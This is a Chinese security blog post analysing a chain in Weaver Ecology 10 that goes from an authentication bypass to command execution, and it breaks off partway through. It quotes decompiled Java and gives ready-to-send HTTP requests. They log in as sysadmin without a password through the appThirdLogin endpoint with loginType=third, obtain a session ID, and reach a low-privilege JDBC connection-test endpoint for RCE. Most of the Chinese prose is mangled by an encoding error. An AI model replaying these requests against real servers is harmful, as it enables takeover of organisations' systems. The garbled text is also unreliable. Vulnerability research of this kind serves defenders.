---
title: 浅析泛微ec10权限绕过到命令执行
url: https://y4tacker.github.io/2024/08/20/year/2024/8/%E6%B3%9B%E5%BE%AEec10%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87%E5%88%B0%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/
source: Y4tacker:Hacking The World!
date: 2024-08-21
fetch_date: 2025-10-06T18:02:00.271604
---

# 浅析泛微ec10权限绕过到命令执行

* [Home](/)
* [Writing](/archives/)
* [Topics](/tags/)
* [Search](/search/)
* [About](/about/)
* [Friends](/link/)

Previous post Next post Back to top Share post

1. [1. еҲҶжһҗ](#%E5%88%86%E6%9E%90)

# жө…жһҗжіӣеҫ®ec10жқғйҷҗз»•иҝҮеҲ°е‘Ҫд»Өжү§иЎҢ

Y4tacker

2024-08-20 (Updated: 2025-09-02)

[Java](/categories/Java/)

[Ecology](/tags/Ecology/), [Java](/tags/Java/)

## еҲҶжһҗ

йҰ–е…ҲжҳҜжҺҘеҸЈ`/papi/passport/rest/appThirdLogin`

|  |  |
| --- | --- |
| ``` 1 2 3 4 5 6 7 8 9 10 11 ``` | ``` @RequestMapping(     value = {"/appThirdLogin"},     method = {RequestMethod.POST},     params = {"username", "service", "ip"},     produces = {"application/json; charset=UTF-8"} ) public Map<String, String> appThirdLogin(HttpServletRequest request, HttpServletResponse response, final String username, String service, final String ip) {     String loginType = request.getParameter("loginType");     String tgtId = SecurityCasUtils.getCookie(request, "ETEAMS_TGC");     return this.restLoginService.appThirdLogin(loginType, tgtId, response, username, service, ip, "zh_CN"); } ``` |

йҖҡиҝҮжҺҘеҸЈз”ҹжҲҗticketзҡ„иҝҮзЁӢдёӯпјҢеҪ“жІЎжңүticketж—¶пјҢеҪ“дј е…ҘusernameеҗҺпјҢеңЁеҮҪж•°йҖ»иҫ‘дёӯпјҢйҰ–е…Ҳдёәcredentialи®ҫзҪ®дәҶnoPasswordеұһжҖ§

![image-20240820224632691](/2024/08/20/year/2024/8/%E6%B3%9B%E5%BE%AEec10%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87%E5%88%B0%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/image-20240820224632691.png)

жҺҘдёӢжқҘеңЁеҲӣе»әticketеүҚдјҡе…ҲеӨ„зҗҶи®ӨиҜҒ

|  |  |
| --- | --- |
| ``` 1 2 3 4 5 6 7 8 9 10 11 12 13 14 ``` | ``` // com.weaver.passport.casserver.ticket.CasLoginTicketServiceImpl    public Authentication authenticate(WeaverUsernamePasswordCredential credential, CasLoginEnum casLoginEnum) throws PassportNoTenantException {       AuthenticationBuilder builder = this.authenticateInternal(credential, casLoginEnum);       return builder.build();   } public String createTicketGrantingTicket(WeaverUsernamePasswordCredential credential, CasLoginEnum casLoginEnum) throws PassportNoTenantException {       this.basicLicenseControl.checkLicense();       Authentication authentication = this.authenticate(credential, casLoginEnum);       TicketGrantingTicket ticketGrantingTicket = new TicketGrantingTicketImpl(this.ticketGrantingTicketUniqueTicketIdGenerator.getNewTicketId("TGT"), authentication, this.ticketGrantingTicketExpirationPolicy);       String tgtId = ticketGrantingTicket.getId();       this.getTicketRegistry(casLoginEnum).addTicket(ticketGrantingTicket);       return tgtId;   } ``` |

еҸҜд»ҘзңӢеҲ°пјҢз”ұдәҺд№ӢеүҚи®ҫзҪ®дәҶnoPasswordеұһжҖ§,`credential.getNoPassword() != null && credential.getNoPassword()`дёҖе®ҡдёәtrueпјҢеҰӮжһң`CasLoginEnum.notCheckPassword(casLoginEnum)`д№ҹдёәtrueпјҢеҲҷдёҚйңҖиҰҒеҜҶз ҒеҚіеҸҜе®ҢжҲҗи®ӨиҜҒ

![image-20240820225027645](/2024/08/20/year/2024/8/%E6%B3%9B%E5%BE%AEec10%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87%E5%88%B0%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/image-20240820225027645.png)

еҸҜд»ҘзңӢеҲ°д»…йңҖе…¶дёҖеҚіеҸҜпјҢ

|  |  |
| --- | --- |
| ``` 1 2 3 4 5 ``` | ``` // com.weaver.passport.enums.CasLoginEnum    public static boolean notCheckPassword(CasLoginEnum loginEnum) {   return loginEnum == PC_QRCODE || loginEnum == THIRD || loginEnum == PC_LDAP || loginEnum == PC_WECHAT || loginEnum == PC_WEIBO || loginEnum == PC_QQ || loginEnum == APP_WEIBO || loginEnum == APP_QQ || loginEnum == APP_WECHAT || loginEnum == APP_APPLE; } ``` |

еӣ жӯӨз¬¬дёҖжӯҘиҺ·еҸ–ticketзҡ„Payloadе№¶дёҚйҡҫзҗҶи§Ј

|  |  |
| --- | --- |
| ``` 1 2 3 4 5 6 7 ``` | ``` POST /papi/passport/rest/appThirdLogin?username=sysadmin&service=1&ip=1&loginType=third HTTP/1.1 Host:  Accept-Encoding: gzip, deflate, br Accept: */* Accept-Language: en-US;q=0.9,en;q=0.8 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.6533.100 Safari/537.36 Content-Type: application/x-www-form-urlencoded ``` |

жҺҘдёӢжқҘеңЁиҺ·еҸ–еҲ°дәҶ`serviceTicketId`еҗҺ,йҖҡиҝҮ`generateEteamsId`жҺҘеҸЈжҲ‘д»¬дҫҝиғҪеҫ—еҲ°`EteamsId`пјҢиҝҷйҮҢзҡ„жөҒзЁӢе…¶е®һжҜ”иҫғеӨҚжқӮпјҢз®ҖеҚ•д»ҺиӢұж–ҮзңӢзңӢйҖ»иҫ‘еҚіеҸҜ

|  |  |
| --- | --- |
| ``` 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 ``` | ``` // com.weaver.passport.controller.PassportLoginController @RequestMapping(     value = {"/generateEteamsId"},     method = {RequestMethod.POST} ) @ResponseBody public WeaResult<String> generateEteamsId(@RequestParam String stTicket, @RequestParam(required = false) String service, HttpServletRequest request) {     logger.info("############# generateEteamsId [stTicket]{}", stTicket, service);     String eteamsId = this.passportEteamsIdService.generateEteamsIdBySt(stTicket, service, (String)null, request);     logger.info("############# generateEteamsId [stTicket]{} [eteamsId]{}", stTicket, eteamsId);     return WeaResult.success(eteamsId); }  // com.weaver.passport.service.eteamsid.PassportEteamsIdServiceImpl public String generateEteamsIdBySt(String stTicket, String service, String ip, HttpServletRequest request) {     try {         if (StringUtils.isEmpty(service)) {             service = this.hostUtil.getRealWebHost();         }          logger.info("############# generateEteamsIdBySt [st]{} [service]{}", stTicket, service);         Assertion assertion = this.validateSt(stTicket, service);         TeamsUserDetails teamsUserDetails = (TeamsUserDetails)this.userDetailsService.loadUserDetails(assertion);         String tokenId = SecurityCasUtils.generateTokenId(stTicket, teamsUserDetails.findLoginType());         List<GrantedAuthority> authorities = (List)teamsUserDetails.getAuthorities();         CasAuthenticationToken cat = new CasAuthenticationToken("eteams432534gfdg", teamsUserDetails, stTicket, authorities, teamsUserDetails, assertion);         SecurityContext context = SecurityContextHolder.getContext();         context.setAuthentication(cat);         this.securityContextCache.put(tokenId, context);         ClientInfo clientInfo = new ClientInfo();         if (request != null) {             ClientInfo.obtainClient(request);             this.setIpCache(IpUtil.getRemoteHost(request), teamsUserDetails.getUser().getEmployeeId());         }          if (!StringUtils.isEmpty(ip)) {             this.setIpCache(ip, teamsUserDetails.getUser().getEmployeeId());         }          this.remoteBasicCommonService.postLoginSuccess(teamsUserDetails.getTenant(), teamsUserDetails.getUser().getEmployeeId(), clientInfo, new Date());         return tokenId;     } catch (Exception var12) {         Exception e = var12;         logger.error("########## generateEteamsIdBySt error...[st]{} [service]{}", new Object[]{stTicket, service, e});         return null;     } } ``` |

|  |  |
| --- | --- |
| ``` 1 2 3 4 5 6 7 8 ``` | ``` POST /papi/passport/login/generateEteamsId?stTicket=xxxxx HTTP/1.1 Host:   Accept-Encoding: gzip, deflate, br Accept: */* Accept-Language: en-US;q=0.9,en;q=0.8 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.6533.100 Safari/537.36 Cache-Control: max-age=0 Content-Type: application/x-www-form-urlencoded ``` |

д№ӢеҗҺеңЁжңүдәҶ`ETEAMSID`д№ӢеҗҺпјҢжҲ‘д»¬еҚіеҸҜе®ҢжҲҗеҗҺеҸ°rceпјҢжҺҘеҸЈеңЁ`/api/dw/connSetting/testConnByBasePassword`пјҢжіЁж„ҸиҝҷйҮҢзҡ„`publicPermission = true`пјҢиҜҙжҳҺжҳҜдҪҺжқғйҷҗпјҢдёҚйңҖиҰҒadminз”ЁжҲ·пјҢз»ҸиҝҮжөӢиҜ•иҝҷйҮҢд№ҹе’Ңзҷ»еҪ•ж ЎйӘҢж— е…і

|  |  |
| --- | --- |
| ``` 1 2 3 4 5 6 7 8 9 ``` | ``` // com.weaver.dw.datamodel.controller.DataConnController @RequestMapping({"/testConnByBasePassword"}) @WeaPermission(     publicPermission = true ) public WareResult testConnByBasePassword(@RequestBody DataSetConn conn, Employee employee) {     conn.setDbPassword(SqlValidateUtil.base64ToString(conn.getDbPassword()));     return this.testConn(conn, employee); } ``` |

еңЁд№ӢеҗҺjdbcй“ҫжҺҘж—¶жңүдёӘе°Ҹз»ҶиҠӮпјҢйҰ–е…Ҳдјҡж №жҚ®дј е…Ҙзҡ„getDbTypeеҸӮж•°йҖүжӢ©еҜ№еә”й©ұеҠЁпјҢиҝҷйҮҢеҫҲеӨҡjdbcйғҪеҸҜд»Ҙе°қиҜ•жү“дёҖдёӢз§Қзұ»жҢәйҪҗе…ЁпјҢдҪҶ`getDbDriverByType`дёӯе”Ҝз...